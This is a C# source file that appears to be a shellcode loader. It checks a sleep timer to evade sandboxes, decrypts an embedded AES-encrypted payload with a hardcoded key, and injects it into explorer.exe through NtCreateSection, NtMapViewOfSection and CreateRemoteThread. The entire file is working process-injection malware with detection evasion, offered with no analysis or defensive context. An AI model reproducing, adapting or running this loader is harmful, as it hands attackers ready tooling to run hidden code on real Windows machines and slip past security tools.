using System.Runtime.InteropServices;
using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace rev
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        //Payload decryptor
        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }
        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }

        //Execute payload
        public static void Main()
        {
            //Sandbox bypass
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // Change AES encrypted payload and key strings
            string payload = "DSJXmivDiSlcgQZ13Tn0j8n7nffAMpxveCPmsBnqfQBjXNKIHnnPE0WnaqOPkNtt9Ic6XjRWiVCZAoq8/4vd8edJIpWSdSxw8vTucIpwJhK82Y/7aLVbLYKIFcKTsjKZGbADmqPgVkZJ+9Nj0zRErzbu7o4Ezn3XDAwmppC1UBo6ZKsvjj9PWiwwc8d2E2KCdnvtaLCy7U4Ap25wFW1AHDPC/X4pK3G+UkkT77O2zejKquRSUDdT7q2XxSrL0DkiwbAJsgOUrdchWyO3UjKJ7h34WUQtX2fJUMq2iSY+h+cCHCkKMwxg+XfDG64Hq1RWf4cdVROra0edagFlpciYqrMEmLBHGuEQEyaCYoG/w3x47UTPlfb1nR9o2DqiDTQAJcj9+X2AeqhgPcecmCCgi1BPqxCafYt4ZL0ORJRn9RYp6GXzNoJcA/MawFL0BF0IpmUxof9l80oAM4HliUjCmUVlnW6iOJMYOjaho89FyPa6ROyao/qtMb8nNoE5F7R7cO05zqI4WxRFDRHB+MAQmGcoqBl2+48sU/7SQk6ttywpHUkO5Th+EAPUknB3CleM4mNX/jYnUOm2TJ0XAyzKe4XM1Stp6w7R4i/+8hkTF0LfFsBqW3JcteLKdmDJU2FgNjMhh0oz71MolulZC161IKNejJ1nRJonM8wVkvcdFDfzsRmJ6B3RTCSs4ST1a3mgy0wwMfrdHIEFNs+E/at80jGBTUM0Rsbxlm7UORm5HoqXYqkdsRdKHBPkuI7wNEEgp5LnKWkwxMRbhXQR4nzFhNYCYaCE+u8Lquf7u5Hj4Ys2zK4fROjG5ZQTTZc0GoEYb+jYO4Ar12uR4tZ1HSFVbpewpUXYhiY6/xfPr5bfpAjZWe/FoPh9jxUPAE8sHee4pRV05OTEzkFOpT0bSjh3FEx74UPvvWlR5Cx6aX61WWA=";
            string key = "TqyobQRG71o49iR19bWZ2if1X1IBXJb6";

            byte[] buf = Decrypt(key, payload);

            long buffer_size = buf.Length;
            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            return;
        }
    }
}
